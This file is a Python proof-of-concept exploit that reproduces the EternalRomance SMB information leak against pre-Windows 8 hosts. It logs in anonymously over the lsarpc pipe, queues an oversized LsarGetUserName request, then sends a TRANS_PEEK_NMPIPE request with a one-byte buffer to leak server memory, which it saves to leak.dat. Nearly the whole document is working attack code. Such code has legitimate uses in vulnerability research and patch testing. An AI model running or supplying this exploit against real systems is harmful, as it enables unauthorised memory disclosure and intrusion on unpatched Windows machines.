from mysmb import MYSMB
from impacket import smb, smbconnection
from impacket.dcerpc.v5 import transport, lsat, ndr
from struct import pack, unpack
import sys

'''
PoC: demonstrates how NSA eternalromance does the info leak

Note:
- this PoC only support lsaprc named pipe
- this method works against only Windows<8
'''

USERNAME = ''
PASSWORD = ''

if len(sys.argv) != 2:
	print("{} <ip>".format(sys.argv[0]))
	sys.exit(1)

target = sys.argv[1]
pipe_name = 'lsarpc'


conn = MYSMB(target)
conn.login(USERNAME, PASSWORD)

smbConn = smbconnection.SMBConnection(target, target, existingConnection=conn, manualNegotiate=True)
dce = transport.SMBTransport(target, filename=pipe_name, smb_connection=smbConn).get_dce_rpc()
dce.connect()

conn.set_default_tid(conn.get_last_tid())
fid = conn.get_last_fid()

dce.bind(lsat.MSRPC_UUID_LSAT)

# send LsarGetUserName without getting result so there are data in named pipe to peek
request = lsat.LsarGetUserName()
request['SystemName'] = "\x00"
request['UserName'] = "A"*263+'\x00'  # this data size determines how many bytes of data we can leak
request['DomainName'] = ndr.NULL
dce.call(request.opnum, request)


# send TRANS_PEEK_NMPIPE (0x23) request with small OutData buffer to leak info
recvPkt = conn.send_trans(pack('<HH', 0x23, fid), '', '', maxDataCount=1, maxParameterCount=0x5400, maxSetupCount=1)
resp = smb.SMBCommand(recvPkt['Data'][0])
data = resp['Data'][1+6+2:]  # skip padding, parameter, padding

open('leak.dat', 'wb').write(data)
print('All return data is written to leak.dat')


# receive result to clear name pipe data
dce.recv()

dce.disconnect()
conn.logoff()
conn.get_socket().close()
